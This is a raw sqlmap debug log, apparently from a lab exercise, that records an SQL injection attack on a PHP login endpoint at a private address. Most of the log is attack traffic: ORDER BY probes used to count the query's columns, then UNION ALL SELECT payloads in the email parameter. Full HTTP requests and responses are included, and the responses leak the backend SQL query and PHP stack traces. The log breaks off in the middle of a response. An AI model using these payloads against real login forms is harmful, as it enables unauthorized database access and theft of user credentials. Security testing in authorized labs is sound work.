[03:42:16] [DEBUG] skipping test 'Oracle OR time-based blind (comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Oracle AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Oracle OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Oracle AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Oracle OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'IBM DB2 AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'IBM DB2 OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'IBM DB2 AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'IBM DB2 OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'SQLite > 2.0 AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'SQLite > 2.0 OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'SQLite > 2.0 AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'SQLite > 2.0 OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Firebird >= 2.0 AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Firebird >= 2.0 OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Firebird >= 2.0 AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Firebird >= 2.0 OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'SAP MaxDB AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'SAP MaxDB OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'SAP MaxDB AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'SAP MaxDB OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'HSQLDB >= 1.7.2 AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'HSQLDB >= 1.7.2 OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'HSQLDB >= 1.7.2 AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'HSQLDB >= 1.7.2 OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'HSQLDB > 2.0 AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'HSQLDB > 2.0 OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'HSQLDB > 2.0 AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'HSQLDB > 2.0 OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Informix AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Informix OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Informix AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Informix OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'ClickHouse AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'ClickHouse OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - Parameter replace' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (bool)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (ELT)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (MAKE_SET)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'PostgreSQL > 8.1 time-based blind - Parameter replace' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'PostgreSQL time-based blind - Parameter replace (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (heavy queries)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Firebird time-based blind - Parameter replace (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'SAP MaxDB time-based blind - Parameter replace (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'IBM DB2 time-based blind - Parameter replace (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'HSQLDB >= 1.7.2 time-based blind - Parameter replace (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'HSQLDB > 2.0 time-based blind - Parameter replace (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Informix time-based blind - Parameter replace (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind - ORDER BY clause (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'HSQLDB >= 1.7.2 time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [DEBUG] skipping test 'HSQLDB > 2.0 time-based blind - ORDER BY, GROUP BY clause (heavy query)' because the payload for time-based blind has already been identified
[03:42:16] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[03:42:16] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[03:42:16] [PAYLOAD] test@chatai.com' ORDER BY 1-- -
[03:42:16] [TRAFFIC OUT] HTTP request [#57]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20ORDER%20BY%201--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:16] [CRITICAL] unable to connect to the target URL ('Broken pipe'). sqlmap is going to retry the request(s)
[03:42:16] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session --technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')                                                                                                
[03:42:16] [TRAFFIC OUT] HTTP request [#58]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20ORDER%20BY%201--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:16] [TRAFFIC IN] HTTP response [#58] (200 OK):
Date: Sun, 19 Oct 2025 07:42:16 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 127
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20ORDER%20BY%201--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' ORDER BY 1-- -'"
    ]
}
[03:42:16] [PAYLOAD] test@chatai.com' ORDER BY 7335-- -
[03:42:16] [TRAFFIC OUT] HTTP request [#59]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20ORDER%20BY%207335--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:16] [TRAFFIC IN] HTTP response [#59] (200 OK):
Date: Sun, 19 Oct 2025 07:42:16 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=l7b4lha4qa7hkv94pjd7adb1vq; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20ORDER%20BY%207335--%20-&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:42:16] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[03:42:16] [PAYLOAD] test@chatai.com' ORDER BY 10-- -
[03:42:16] [TRAFFIC OUT] HTTP request [#60]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20ORDER%20BY%2010--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:16] [TRAFFIC IN] HTTP response [#60] (200 OK):
Date: Sun, 19 Oct 2025 07:42:16 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=3jq5hafn284v6efui9h175c1il; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20ORDER%20BY%2010--%20-&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:42:16] [PAYLOAD] test@chatai.com' ORDER BY 6-- -
[03:42:16] [TRAFFIC OUT] HTTP request [#61]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20ORDER%20BY%206--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:16] [TRAFFIC IN] HTTP response [#61] (200 OK):
Date: Sun, 19 Oct 2025 07:42:16 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=7m3lie6ih9aqip4i1cb1bvh2cl; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20ORDER%20BY%206--%20-&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:42:16] [PAYLOAD] test@chatai.com' ORDER BY 4-- -
[03:42:16] [TRAFFIC OUT] HTTP request [#62]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20ORDER%20BY%204--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:16] [TRAFFIC IN] HTTP response [#62] (200 OK):
Date: Sun, 19 Oct 2025 07:42:16 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 127
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20ORDER%20BY%204--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' ORDER BY 4-- -'"
    ]
}
[03:42:16] [PAYLOAD] test@chatai.com' ORDER BY 5-- -
[03:42:16] [TRAFFIC OUT] HTTP request [#63]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20ORDER%20BY%205--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:16] [TRAFFIC IN] HTTP response [#63] (200 OK):
Date: Sun, 19 Oct 2025 07:42:16 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=rj0r3ikjrlg77kueio3jf3jblg; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20ORDER%20BY%205--%20-&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:42:16] [INFO] target URL appears to have 4 columns in query
[03:42:16] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,NULL,CONCAT(0x7176766b71,0x58674871696d786f644d69477642736d684d574e75714e58705353526f507a6f5a72436c43495378,0x7176766b71),NULL-- -
[03:42:16] [TRAFFIC OUT] HTTP request [#64]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7176766b71%2C0x58674871696d786f644d69477642736d684d574e75714e58705353526f507a6f5a72436c43495378%2C0x7176766b71%29%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:17] [TRAFFIC IN] HTTP response [#64] (200 OK):
Date: Sun, 19 Oct 2025 07:42:16 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 265
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7176766b71%2C0x58674871696d786f644d69477642736d684d574e75714e58705353526f507a6f5a72436c43495378%2C0x7176766b71%29%2CNULL--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT NULL,NULL,CONCAT(0x7176766b71,0x58674871696d786f644d69477642736d684d574e75714e58705353526f507a6f5a72436c43495378,0x7176766b71),NULL-- -'"
    ]
}
[03:42:17] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176766b71,0x6a7842484852776a4978656d7449746c68796e6564474159777a6f4b714676524b41615a41744f4e,0x7176766b71)-- -
[03:42:17] [TRAFFIC OUT] HTTP request [#65]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7176766b71%2C0x6a7842484852776a4978656d7449746c68796e6564474159777a6f4b714676524b41615a41744f4e%2C0x7176766b71%29--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:17] [TRAFFIC IN] HTTP response [#65] (200 OK):
Date: Sun, 19 Oct 2025 07:42:17 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 265
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7176766b71%2C0x6a7842484852776a4978656d7449746c68796e6564474159777a6f4b714676524b41615a41744f4e%2C0x7176766b71%29--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176766b71,0x6a7842484852776a4978656d7449746c68796e6564474159777a6f4b714676524b41615a41744f4e,0x7176766b71)-- -'"
    ]
}
[03:42:17] [PAYLOAD] test@chatai.com' UNION ALL SELECT CONCAT(0x7176766b71,0x6a6959616e56654f64514971486c626377496a554f47454749796d55415a73746d6c6b5a624e754f,0x7176766b71),NULL,NULL,NULL-- -
[03:42:17] [TRAFFIC OUT] HTTP request [#66]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x6a6959616e56654f64514971486c626377496a554f47454749796d55415a73746d6c6b5a624e754f%2C0x7176766b71%29%2CNULL%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:17] [TRAFFIC IN] HTTP response [#66] (200 OK):
Date: Sun, 19 Oct 2025 07:42:17 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 265
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x6a6959616e56654f64514971486c626377496a554f47454749796d55415a73746d6c6b5a624e754f%2C0x7176766b71%29%2CNULL%2CNULL%2CNULL--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT CONCAT(0x7176766b71,0x6a6959616e56654f64514971486c626377496a554f47454749796d55415a73746d6c6b5a624e754f,0x7176766b71),NULL,NULL,NULL-- -'"
    ]
}
[03:42:17] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,CONCAT(0x7176766b71,0x44585350564e61546d4b74637641677a7169797953556d56686b6a465a6677516d774956556d4470,0x7176766b71),NULL,NULL-- -
[03:42:17] [TRAFFIC OUT] HTTP request [#67]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7176766b71%2C0x44585350564e61546d4b74637641677a7169797953556d56686b6a465a6677516d774956556d4470%2C0x7176766b71%29%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:17] [TRAFFIC IN] HTTP response [#67] (200 OK):
Date: Sun, 19 Oct 2025 07:42:17 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 265
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7176766b71%2C0x44585350564e61546d4b74637641677a7169797953556d56686b6a465a6677516d774956556d4470%2C0x7176766b71%29%2CNULL%2CNULL--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT NULL,CONCAT(0x7176766b71,0x44585350564e61546d4b74637641677a7169797953556d56686b6a465a6677516d774956556d4470,0x7176766b71),NULL,NULL-- -'"
    ]
}
[03:42:17] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,NULL,CONCAT(0x7176766b71,0x66454e71474a454e5157,0x7176766b71),NULL-- -
[03:42:17] [TRAFFIC OUT] HTTP request [#68]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7176766b71%2C0x66454e71474a454e5157%2C0x7176766b71%29%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:17] [TRAFFIC IN] HTTP response [#68] (200 OK):
Date: Sun, 19 Oct 2025 07:42:17 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 205
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7176766b71%2C0x66454e71474a454e5157%2C0x7176766b71%29%2CNULL--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT NULL,NULL,CONCAT(0x7176766b71,0x66454e71474a454e5157,0x7176766b71),NULL-- -'"
    ]
}
[03:42:17] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176766b71,0x547a45456a6567484174,0x7176766b71)-- -
[03:42:17] [TRAFFIC OUT] HTTP request [#69]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7176766b71%2C0x547a45456a6567484174%2C0x7176766b71%29--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:17] [TRAFFIC IN] HTTP response [#69] (200 OK):
Date: Sun, 19 Oct 2025 07:42:17 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 205
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7176766b71%2C0x547a45456a6567484174%2C0x7176766b71%29--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176766b71,0x547a45456a6567484174,0x7176766b71)-- -'"
    ]
}
[03:42:17] [PAYLOAD] test@chatai.com' UNION ALL SELECT CONCAT(0x7176766b71,0x78546344677161727050,0x7176766b71),NULL,NULL,NULL-- -
[03:42:17] [TRAFFIC OUT] HTTP request [#70]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x78546344677161727050%2C0x7176766b71%29%2CNULL%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:17] [TRAFFIC IN] HTTP response [#70] (200 OK):
Date: Sun, 19 Oct 2025 07:42:17 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 205
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x78546344677161727050%2C0x7176766b71%29%2CNULL%2CNULL%2CNULL--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT CONCAT(0x7176766b71,0x78546344677161727050,0x7176766b71),NULL,NULL,NULL-- -'"
    ]
}
[03:42:17] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,CONCAT(0x7176766b71,0x6e72584e504265597345,0x7176766b71),NULL,NULL-- -
[03:42:17] [TRAFFIC OUT] HTTP request [#71]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7176766b71%2C0x6e72584e504265597345%2C0x7176766b71%29%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:17] [TRAFFIC IN] HTTP response [#71] (200 OK):
Date: Sun, 19 Oct 2025 07:42:17 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 205
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7176766b71%2C0x6e72584e504265597345%2C0x7176766b71%29%2CNULL%2CNULL--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT NULL,CONCAT(0x7176766b71,0x6e72584e504265597345,0x7176766b71),NULL,NULL-- -'"
    ]
}
[03:42:17] [PAYLOAD] -9276' UNION ALL SELECT CONCAT(0x7176766b71,0x4346547873736b5967766573596850576a6b714250584d70705777694358654f7945554f666d435a,0x7176766b71),NULL,NULL,NULL-- -
[03:42:17] [TRAFFIC OUT] HTTP request [#72]:
GET /ai/includes/user_login.php?email=-9276%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x4346547873736b5967766573596850576a6b714250584d70705777694358654f7945554f666d435a%2C0x7176766b71%29%2CNULL%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:17] [TRAFFIC IN] HTTP response [#72] (200 OK):
Date: Sun, 19 Oct 2025 07:42:17 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 255
Connection: close
